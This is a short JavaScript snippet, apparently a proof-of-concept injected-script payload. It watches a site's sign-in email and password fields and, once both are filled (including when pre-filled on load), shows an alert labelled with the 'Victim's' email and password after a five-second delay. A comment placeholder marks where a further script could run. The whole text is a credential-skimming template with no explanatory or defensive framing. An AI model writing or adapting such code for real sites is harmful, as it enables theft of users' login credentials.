let isFilled = false;

 function checkInputs() {
    const input1 = document.getElementById('signin-email');
    const input2 = document.getElementById('signin-password');

    if (input1.value && input2.value) {
      if (!isFilled) {
        isFilled = true; // Ensure the script runs only once
        setTimeout(function() {
          alert("Victim's email: "+document.getElementsByName('logonId')[0].value+"\nVictim's Password:"+document.getElementsByName('logonPassword')[0].value);
          // Your script or function to run here
        }, 5000); // Delay of 5 seconds
      }
    }
  }

  // Check inputs immediately when the page loads (in case they are pre-filled)
  window.onload = checkInputs;

 // Listen for input changes
  document.getElementById('signin-email').addEventListener('input', checkInputs);
  document.getElementById('signin-password').addEventListener('input', checkInputs);
